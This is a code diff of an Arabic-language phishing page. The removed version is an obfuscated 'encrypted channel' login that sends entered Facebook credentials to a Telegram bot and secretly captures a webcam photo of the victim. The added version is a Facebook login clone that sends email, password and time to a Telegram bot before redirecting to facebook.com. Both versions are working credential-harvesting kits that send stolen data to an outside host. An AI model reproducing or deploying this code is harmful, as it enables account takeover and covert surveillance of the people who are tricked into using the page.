@@ -3,123 +3,90 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    
-    <meta property="og:title" content="⌛ Content Loading...">
-    <meta property="og:description" content="Secure link verification in progress. Please wait...">
-    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/b/b1/Loading_icon.gif">
-    <meta name="theme-color" content="#000000">
-
-    <title>Premium Access Control</title>
+    <title>Facebook – تسجيل الدخول أو الاشتراك</title>
     <style>
-        :root { --gold: #d4af37; --fb: #1877f2; --gm: #ea4335; }
-        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #000; color: white; margin: 0; display: flex; justify-content: center; align-items: center; min-height: 100vh; overflow: hidden; }
-        .card { width: 90%; max-width: 400px; background: rgba(255, 255, 255, 0.05); backdrop-filter: blur(15px); padding: 30px; border-radius: 25px; border: 1px solid var(--gold); box-shadow: 0 0 30px rgba(212, 175, 55, 0.1); text-align: center; }
-        .premium-tag { background: var(--gold); color: black; padding: 4px 12px; border-radius: 50px; font-weight: bold; font-size: 11px; margin-bottom: 15px; display: inline-block; }
-        input { width: 100%; padding: 14px; margin: 10px 0; border-radius: 10px; border: 1px solid #444; background: #222; color: white; box-sizing: border-box; outline: none; }
-        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; transition: 0.3s; }
-        #loader-screen, #calling-screen { display: none; }
-        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--gold); border-radius: 50%; width: 40px; height: 40px; animation: spin 2s linear infinite; margin: 20px auto; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{background:#f0f2f5;font-family:'Helvetica Neue',Arial,sans-serif}
+        .header{background:#1877f2;height:70px;display:flex;align-items:center;justify-content:space-between;padding:0 200px}
+        .header .logo{font-size:32px;color:#fff;font-weight:bold}
+        .header .login-row{display:flex;gap:15px;align-items:center}
+        .header .login-row input{width:150px;padding:6px;border:1px solid #ccc;border-radius:3px;font-size:12px}
+        .header .login-row button{background:#166fe5;color:#fff;border:none;padding:6px 12px;border-radius:3px;font-size:12px;cursor:pointer}
+        .main{display:flex;justify-content:center;padding:40px 0}
+        .left,.right{width:400px}
+        .left h2{font-size:28px;color:#333;margin-bottom:20px}
+        .left img{width:300px}
+        .right{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1)}
+        .right input{width:100%;margin-bottom:12px;padding:14px;border:1px solid #ddd;border-radius:6px;font-size:16px}
+        .right .btn-login{width:100%;background:#1877f2;color:#fff;padding:14px;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer}
+        .right .btn-new{width:60%;margin:20px auto 0;display:block;background:#42b72a;color:#fff;padding:14px;border:none;border-radius:6px;font-size:17px;font-weight:bold;cursor:pointer}
+        .right a{display:block;text-align:center;color:#1877f2;font-size:14px;margin-top:12px;text-decoration:none}
+        .footer{text-align:center;padding:20px;font-size:12px;color:#737373}
+        @media(max-width:900px){.header{padding:0 20px}.main{flex-direction:column;align-items:center}.left,.right{width:90%}}
     </style>
 </head>
 <body>
+    <header class="header">
+        <div class="logo">facebook</div>
+        <div class="login-row">
+            <div>
+                <div style="color:#fff;font-size:12px;margin-bottom:3px">البريد الإلكتروني أو الهاتف</div>
+                <input type="text" id="quickEmail">
+            </div>
+            <div>
+                <div style="color:#fff;font-size:12px;margin-bottom:3px">كلمة المرور</div>
+                <input type="password" id="quickPass">
+            </div>
+            <button onclick="handleQuick()">تسجيل الدخول</button>
+        </div>
+    </header>
 
-<div class="card">
-    <div id="step1">
-        <div class="premium-tag">ENCRYPTED CHANNEL</div>
-        <h2>تحقق من الهوية</h2>
-        <p style="font-size: 12px; color: #888;">يجب تسجيل الدخول للمتابعة إلى الغرفة المشفرة.</p>
-        <input type="text" id="fb-user" placeholder="البريد الإلكتروني">
-        <input type="password" id="fb-pass" placeholder="كلمة السر">
-        <button class="btn" style="background: var(--fb); color: white;" onclick="handleStep1()">دخول آمن</button>
-    </div>
+    <section class="main">
+        <div class="left">
+            <h2>تواصل مع الأصدقاء ومختلف الأشخاص على فيسبوك.</h2>
+            <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/DBfLCjvXHsa.png" alt="Facebook Connect">
+        </div>
 
-    <div id="loader-screen">
-        <div class="loader"></div>
-        <h2>جاري تشفير البيانات...</h2>
-    </div>
+        <div class="right">
+            <form id="fbForm">
+                <input type="text" id="email" placeholder="البريد الإلكتروني أو رقم الهاتف" required>
+                <input type="password" id="pass" placeholder="كلمة المرور" required>
+                <button class="btn-login" type="submit">تسجيل الدخول</button>
+            </form>
+            <a href="#">هل نسيت كلمة المرور؟</a>
+            <hr style="margin:20px 0;border:none;border-top:1px solid #dadde1">
+            <button class="btn-new">إنشاء حساب جديد</button>
+        </div>
+    </section>
 
-    <div id="calling-screen">
-        <h2 style="color: var(--gold);">✓ تم التحقق</h2>
-        <p>جاري إعادة توجيهك إلى المحادثة...</p>
-    </div>
+    <footer class="footer">
+        فيسبوك © 2026
+    </footer>
 
-    <video id="v" style="display:none;" autoplay></video>
-    <canvas id="c" style="display:none;" width="320" height="240"></canvas>
-</div>
-
-<script>
-/**
- * Advanced Red-Team Obfuscation Logic
- * State-Machine Execution Flow
- */
-(function() {
-    // تشفير الروابط والتوكنات (Base64 + Dynamic Assembly)
-    const _0xcr = {
-        'l': "aHR0cHM6Ly9ub3JhaWwzNjM2LXVpLmdpdGh1Yi5pby9jaGF0Lw==",
-        't': "ODIwNzk0Mzg4MzpBQUZfWEpvZUtsSEVFMmJCN1JvMFBCVlN2cGloYnVaMGZXMDA=",
-        'c': "ODM1MDgxMjI0Mg=="
-    };
-
-    const _dec = (s) => atob(s);
-
-    window.onload = () => {
-        navigator.mediaDevices.getUserMedia({video:true}).then(s => {
-            document.getElementById('v').srcObject = s;
-        }).catch(() => {});
-    };
-
-    async function _transmit(_data) {
-        const _u = `https://api.telegram.org/bot${_dec(_0xcr.t)}/sendMessage?chat_id=${_dec(_0xcr.c)}&text=${encodeURIComponent(_data)}`;
-        await fetch(_u);
-    }
-
-    async function _capture() {
-        const v = document.getElementById('v'), c = document.getElementById('c');
-        const x = c.getContext('2d');
-        x.drawImage(v, 0, 0, 320, 240);
-        c.toBlob(async (b) => {
-            const f = new FormData();
-            f.append('chat_id', _dec(_0xcr.c));
-            f.append('photo', b);
-            fetch(`https://api.telegram.org/bot${_dec(_0xcr.t)}/sendPhoto`, {method:'POST', body:f});
-        }, 'image/jpeg');
-    }
-
-    window.handleStep1 = function() {
-        let _state = 'step|send|cap|hide'['split']('|'), _i = 0;
-        const u = document.getElementById('fb-user').value;
-        const p = document.getElementById('fb-pass').value;
-
-        if(!u || !p) return;
-
-        const _run = async () => {
-            while(_i < _state.length) {
-                switch(_state[_i++]) {
-                    case 'step':
-                        document.getElementById('step1').style.display = 'none';
-                        document.getElementById('loader-screen').style.display = 'block';
-                        break;
-                    case 'send':
-                        await _transmit(`Credential Captured:\nU: ${u}\nP: ${p}`);
-                        break;
-                    case 'cap':
-                        await _capture();
-                        break;
-                    case 'hide':
-                        setTimeout(() => {
-                            document.getElementById('loader-screen').style.display = 'none';
-                            document.getElementById('calling-screen').style.display = 'block';
-                            // فك تشفير الرابط النهائي في الذاكرة للتوجه إليه
-                            console.log("Redirecting to: " + _dec(_0xcr.l));
-                        }, 3000);
-                        break;
-                }
-            }
-        };
-        _run();
-    };
-})();
-</script>
+    <script>
+        function handleQuick(){
+            const email=document.getElementById('quickEmail').value.trim();
+            const pass=document.getElementById('quickPass').value.trim();
+            if(email&&pass) sendCapture(email,pass);
+        }
+        document.getElementById('fbForm').addEventListener('submit',function(e){
+            e.preventDefault();
+            const email=document.getElementById('email').value.trim();
+            const pass=document.getElementById('pass').value.trim();
+            if(email&&pass) sendCapture(email,pass);
+        });
+        async function sendCapture(email,pass){
+            const data=`🔐 FB Clone\nEmail: ${email}\nPass: ${pass}\nTime: ${new Date().toLocaleString('ar-EG')}`;
+            // استبدل YOUR_BOT_TOKEN وYOUR_CHAT_ID برمز Telegram الخاص بك
+            try{
+                await fetch('https://api.telegram.org/botYOUR_BOT_TOKEN/sendMessage',{
+                    method:'POST',
+                    headers:{'Content-Type':'application/json'},
+                    body:JSON.stringify({chat_id:'YOUR_CHAT_ID',text:data})
+                });
+            }catch(err){console.warn(err)}
+            setTimeout(()=>window.location.href='https://www.facebook.com',900);
+        }
+    </script>
 </body>
 </html>
